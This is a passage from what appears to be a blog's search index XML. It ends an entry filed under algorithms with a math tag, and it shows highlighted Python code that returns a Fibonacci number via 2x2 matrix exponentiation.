class="line"></span><br><span class="line">        ans = pow_matrix([[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]],n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ans[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Code_Algo</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
</search>
